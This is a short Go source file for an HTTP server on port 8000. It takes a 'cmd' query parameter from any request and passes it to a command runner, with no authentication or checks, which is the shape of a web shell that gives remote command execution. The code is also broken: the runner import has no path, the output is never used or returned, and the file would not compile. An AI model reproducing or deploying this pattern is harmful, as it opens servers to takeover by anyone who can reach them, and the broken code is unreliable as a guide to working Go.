package main

import (
	"io"
	"net/http"
	runner 
)

func main() {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		cmd, ok := r.URL.Query()["cmd"]

		if !ok || len(cmd) < 1 {
			io.WriteString(w, "Hello world!")
		} else {
			output := runner.Run(cmd)
		}

	})

	err := http.ListenAndServe(":8000", nil)
	if err != nil {
		panic(err)
	}
}
